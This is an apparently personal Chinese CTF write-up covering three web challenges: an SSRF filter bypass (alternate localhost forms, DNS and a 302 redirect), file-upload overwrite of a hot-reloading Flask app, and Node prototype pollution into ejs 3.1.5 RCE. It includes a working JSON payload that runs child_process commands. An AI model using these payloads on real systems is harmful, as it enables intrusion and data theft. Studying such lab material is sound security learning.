---
created: 2025-11-28
tags:
---

```table-of-contents
title: 
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 0 # Include headings up to the specified level
include: 
exclude: 
includeLinks: true # Make headings clickable
hideWhenEmpty: false # Hide TOC if no headings are found
debugInConsole: false # Print debug info in Obsidian console
```

## 1 ezez_ssrf

> [!info]
> 这道题一开始出的版本更难一点，后来改简单了；由于我一开始原始版本的 wp 已经写了，就一并放到后面吧。

### 1.1 简化版本

我们看直接回显的源码：

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

$url = $_POST['url'] ?? null;
if ($url === null) die("访问本机 8080 端口试试");
$url_parsed = parse_url($url);

if ($url_parsed['scheme'] === 'http' || $url_parsed['scheme'] === 'https') {
  /* $ip = gethostbyname($url_parsed['host']);
  echo '</br>' . $ip . '</br>'; */

  /* if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('不允许的 ip');
  } */

  if (preg_match("/localhost|0/i", $url_parsed["host"])) {
    die("不允许的主机地址");
  }

  $curl = curl_init($url);

  curl_setopt($curl, CURLOPT_HEADER, 0);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);

  $result = curl_exec($curl);
  curl_close($curl);

  echo $result;
} else {
  die('scheme不正确');
}
```

一个经典的 `ssrf` 题目，主要过滤了主机名，要求其中不能正则匹配到 `localhost` 和 `0`；并且配置中开了允许重定向。

这题至少能用三个方法做：
1. 寻找其他不含 `localhost` 和 `0` 的本地地址表示，如 `127.1`(本题环境没开 `ipv6`，`[::1]` 是不行的)
2. 利用域名解析到本地地址，比如用 `safe.taobao.com`，或者用自己的域名
3. 利用重定向 (这个在原始版本里会讲)

下面是实践：

其他本地地址的表示
![[xxCTF三道web-251207-150510.png]]

域名解析到本地地址
![[xxCTF三道web-251207-150555.png]]

### 1.2 原始版本

本题直接回显了源码如下：

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

$url = $_POST['url'] ?? null;
if ($url === null) die("访问本机 8080 端口试试");
$url_parsed = parse_url($url);

if ($url_parsed['scheme'] === 'http' || $url_parsed['scheme'] === 'https') {
  $ip = gethostbyname($url_parsed['host']);
  echo '</br>' . $ip . '</br>';

  if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('不允许的 ip');
  }

  $curl = curl_init($url); // 初始化一个 cURL 会话

  // curl 配置选项：
  curl_setopt($curl, CURLOPT_HEADER, 0); // 不输出响应头
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); // 把获取到的内容返回为字符串，而不是直接输出。
  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); // 跟随重定向

  $result = curl_exec($curl); // 执行 cURL 请求并把结果响应体返回给 $result
  curl_close($curl); // 关闭 cURL 句柄，释放资源。

  echo $result;
} else {
  die('scheme不正确');
}
```

代码就不一行一行解释了，简单来说，就是下面的流程：
1. 用 `parse_url()` 函数解析 `$url`，获取 `url` 由各部分构成的关联数组，保存到变量 `$url_parsed`
2. 用 `gethostbyname()` 函数获取 `$url` 主机地址部分 (即 `$url_parsed['host'])` 的 `ip`，即 `域名/IP/主机名 => IP`
3. 使用 `filter_var` 函数去过滤私有地址 (`PRIV_RANGE`) 和保留地址 (`RES_RANGE`) 的 `ip`
4. 最后就是使用 `curl` 去请求目标 `$url` 并返回请求 `$url` 的响应了，这里使用了 `curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);` 开启了跟随重定向

然后根据这一行提示：`if ($url === null) die("访问本机 8080 端口试试");`，我们需要访问服务器本机的 `http://127.0.0.1:8080/` 来获取 `flag`，即需要让 `curl` 的实际请求地址最终为上述地址，也就是进行 `ssrf` 服务端请求伪造。

这里我仅给出一种方法，就是在自己的 `vps` 上写一个返回 `302` 重定向并且有头部 `Location: http://127.0.0.1:8080/` 的响应的 `http` 服务，然后向 `$url` 传入我们自己的服务器地址，由于是自己的公网地址，所以不会被 `PRIV_RANGE` 和 `RES_RANGE` 规则过滤；并且因为开启了跟随重定向选项，当接收到我们返回的 `302` 响应后，`curl` 就会自动在去访问我们 `Location` 头部指定的任意的地址，也就绕过了 `filter_var`，实现了 `ssrf`。

这里用 `go` 随便写一个返回 `302` 的 `http` 服务，什么语言写无所谓，只要功能类似即可。

![[12.7考核赛web三道wp-251128-200534.png]]

然后把自己的 `vps` 地址填到 `url` 中，即可获得 `flag`

![[12.7考核赛web三道wp-251128-201322.png]]

## 2 ez_go

此题给了源码附件

### 2.1 `main.go`

![[12.7考核赛web三道wp-251128-202235.png]]

`main.go` 中声明了三个路由，
`/` 路由对应处理函数 `func index(c *gin.Context)`，
`/upload` 对应 `func upload(c *gin.Context)`，
`/py_backend` 对应 `func pyBackend(c *gin.Context)`；

这三个函数都在 `handlers.go` 中有定义。

### 2.2 `handlers.go`

#### 2.2.1 `func index(c *gin.Context)`

这个路由主要就是初始化一下 `session` 中的 `username` 字段为 `guest`，并显示欢迎语。

![[12.7考核赛web三道wp-251128-202726.png]]

实际访问的效果是下面这样

![[12.7考核赛web三道wp-251128-202826.png]]

#### 2.2.2 `func upload(c *gin.Context)`

这个路由原本是要验证 `session` 中的 `username` 字段为 `admin` 才能进行后续步骤的，这就需要 `session` 伪造；后来为了降低难度，我就加了一段 `|| true` 把验证给去掉了。

![[12.7考核赛web三道wp-251128-202922.png]]

去掉验证后，这个路由就是纯粹的文件上传的逻辑，其中表单中文件*字段名*为 `file`，文件的保存路径沿用了表单中的 `filename` *原始文件名*(原因下面有解释)。

![[12.7考核赛web三道wp-251128-203805.png]]

由于下面这行代码的 `dst` 为 `file.Filename`，所以这里就是把上传的文件保存到当前工作目录下名为 `file.Filename` 变量的值的文件中，也就是上图的*原始文件名*。

![[12.7考核赛web三道wp-251128-203836.png]]

#### 2.2.3 `func pyBackend(c *gin.Context)`

![[12.7考核赛web三道wp-251128-204557.png]]

这题是把请求的 *查询字符串参数* `query` 的值 (即 `/py_backend?query=xxx` 的 `query=xxx` 键值对的值) 拼接到 `http://127.0.0.1:3000/` 后面，然后去服务端请求这个拼接后的地址，返回请求它的响应结果；

这里我们直接尝试访问一下这个路由，不传 *查询字符串参数*，然后会发现报错了。

通过报错我们很容易知道 `:3000` 端口的是 `python` 的 `flask` 服务。

![[12.7考核赛web三道wp-251128-205018.png]]

我们往下翻一下报错信息，翻到了 `python` 后端源码 `/app/app.py` 的一部分，然后看的注释里面提示了启用了 `debug` 模式支持热重载。
同时，我们也知道这里报错是因为 `request.args.get("name")` 期望一个 *查询字符串参数* `name`，但我们没传。

![[12.7考核赛web三道wp-251128-205225.png]]

### 2.3 解题

结合 `python` 代码可以热重载，以及 `/upload` 路由的文件上传，我们就可以上传一个 `app.py` 覆盖原本的 `app.py`，也就相当于我们能让服务器执行我们想执行的 `python` 代码。

当然，这里还得猜出一点，就是 `/app/app.py` 的目录 `/app/` 下不仅有 `python` 代码 `/app/app.py`，还有 `go` 的可执行程序 `/app/main`；于是我们上传表单中 `filename` 指定为 `app.py` 就能成功覆盖。

现在，让我们上传一个带有命令执行的 `app.py`，注意这个上传包是需要带上请求 `/` 路由时服务器返回的 `cookie` 的，不然过不了 (原因请看 `func upload(c *gin.Context)` 里的逻辑)

![[12.7考核赛web三道wp-251128-210538.png]]

替换完 `app.py` 后，就能执行我们想要执行的命令了 (注意 `?name` 的值需要两次 `url` 编码)。

![[12.7考核赛web三道wp-251128-210917.png]]

## 3 ez_nodejs

![[xxCTF三道web-251207-152353.png]]

这题是 `nodejs` 原型链污染 + `ejs` 模板引擎注入导致远程代码执行的题

本题给了源码包，看到 `routes/` 目录下一共三个文件，代表三个路由：

![[xxCTF三道web-251207-151618.png]]

### 3.1 `/index` 路由

```js
const express = require('express');

const router = express.Router();

router.get('/', function (req, res) {
  if (req.session.login) {
    res.redirect('/flag');
    return;
  }
  res.type('html');
  res.render('index');
});

module.exports = router;
```

逻辑很简单，如果从 `session` 中读到 `login` 为 `true`，也就是已登录，就重定向到 `/flag` 路由； 否则，渲染出 `index` 模板。

模板文件在 `views/` 目录下有写

![[xxCTF三道web-251207-151842.png]]

`index` 模板的显示效果如下图，就是一个登录框

![[xxCTF三道web-251207-151946.png]]

填写用户名密码后，点击提交后，信息交由 `/login` 路由处理。

### 3.2 `/login` 路由

```js
const express = require('express');
const { copy } = require('../pkg/util');

const router = express.Router();

router.post('/', require('body-parser').json(), (req, res) => {
  const { username, password } = req.body;
  if (
    username === 'admin' &&
    password === (process.env.ADMIN_PASSWORD || 'default_password')
  ) {
    copy(req.session, { login: true, ...req.body, password: undefined });
    res.json({ success: true });
    return;
  }
  res.json({ success: false });
});

module.exports = router;
```

这个路由先从 `JSON` 格式的请求体中读出 `username` 和 `password`，然后是一个 `if` 判断，需要 `username === 'admin'` 并且 `password` 要正确。

这里 `password` 先从 `ADMIN_PASSWORD` 环境变量读取，从题目描述中可以知道这个环境变量没有设置，于是用缺省值 `default_password`。

通过 `if` 判断后，紧接着是 `copy(req.session, { login: true, ...req.body, password: undefined })`，把表示已登录的属性 `login: true` 和登录信息 `req.body` 去掉没用的 `password` 的部分复制到 `req.session` 中。

`res.session` 是类 `Session` 的实例，其原型存在且指向 `Session.prototype`，而 `Session.prototype` 的原型指向 `Object.prototype`；

`Object.prototype` 中有两个名为 `__proto__` 的 `getter/setter`(如下图所示)，所有原型链上有 `Object.prototype` 的对象都能用 `obj.__proto__ = {...}` 的方式设置 `obj` 的原型 (标准很早就不推荐这种方式了，但浏览器和 `node` 等运行时环境为了兼容性都一直支持)。

![[xxCTF三道web-251207-154423.png]]

`copy` 函数长这样，可以看到对于 `dst` 中已存在的属性执行的是深拷贝；
而前面的 `req.body` 中保存有 `json` 中间件解析原始 `json` 数据后得到的对象，是一个 `Plain Object`，它的 `__proto__` 属性的值是我们可控的；
而作为 `dst` 的 `req.session` 前面我们已经说了，是能通过 `__proto__` 这一 `getter/setter` 访问到原型的，所以我们就可以通过 `__proto__.__proto__` 两次来访问到 `Object.prototype`，由 `copy` 的深拷贝来污染 `Object.prototype`，算是经典的原型链污染。

```js
function copy(dst, src) {
  for (const k in src) {
    if (!Object.hasOwn(src, k)) continue;
    const v = src[k];

    if (
      k in dst &&
      typeof v === 'object' &&
      v !== null &&
      typeof dst[k] === 'object' &&
      dst[k] !== null
    ) {
      copy(dst[k], v);
    } else {
      dst[k] = v;
    }
  }
}
```

`copy` 执行后返回登录成功的提示，前端接收到提示后，自动重定向到 `/flag` 路由。

### 3.3 `/flag` 路由

```js
const express = require('express');

const router = express.Router();

router.get('/', function (req, res) {
  if (req.session.login) {
    res.type('text/plain; charset=utf-8');
    res.end(
      `你好 ${req.session.username}, 这是你的 flag: fakeFlag{${process.env.fake_flag}}`
    );
  } else {
    res.redirect('/');
  }
});

module.exports = router;
```

这个路由，如果登录成功的话，会返回一个伪 `flag`。

![[xxCTF三道web-251207-160232.png]]

伪 `flag` 中内容 `base64` 解码后可以看到如下提示，告诉我们 `flag` 的真实位置在 `/flag`，并告诉我们 `app.js` 的位置在 `/app/app.js`。

![[xxCTF三道web-251207-160305.png]]

### 3.4 解题

那么我们怎么拿到 `/flag` 中的 `flag` 呢？三个路由本身是没有办法的。

我们看 `package.json` 中 `ejs` 的版本是 `3.1.5`，这个版本可以通过污染 `Object.prototype.outputFunctionName` 实现 `rce`，这题就是利用这个漏洞来做的 (其实也是比较老的洞了，这题本身其实就是改编题)。

![[xxCTF三道web-251207-160609.png]]

`ejs3.1.5` 源码中，`opts.outputFunctionName` 会被拼接到 `prepended` 中，而最终 `prepended` 会被作为一行 `js` 代码执行；
而这个版本的源码中并没有判断这个属性必须是 `ownProperty` 的逻辑，且 `opts` 的原型链上有 `Object.prototype`，那么我们就可以污染 `Object.prototype.outputFunctionName`，最终 `opts` 就能通过原型链访问到我们可控的 `outputFunctionName`，实现 `rce`。

![[xxCTF三道web-251207-161457.png]]

于是有 `payload`：

```payload
{"__proto__":{"__proto__":{"outputFunctionName":"__xxx_=1;process.mainModule.constructor._load('child_process').exec('cp /flag /app/public/flag.txt');var __yyy_"}},"username": "admin", "password": "default_password"}
```

其中，我们用 `process.mainModule.constructor._load('child_process').exec` 执行系统命令，使用 `cp /flag /app/public/flag.txt` 把 `/flag` 文件复制到公开静态资源目录下；然后我们就能直接通过 `url/flag.txt` 访问到它。

在 `/login` 路由发送上述 `payload`，再访问 `url/flag.txt` 即可。

![[xxCTF三道web-251207-162449.png]]

![[xxCTF三道web-251207-162511.png]]
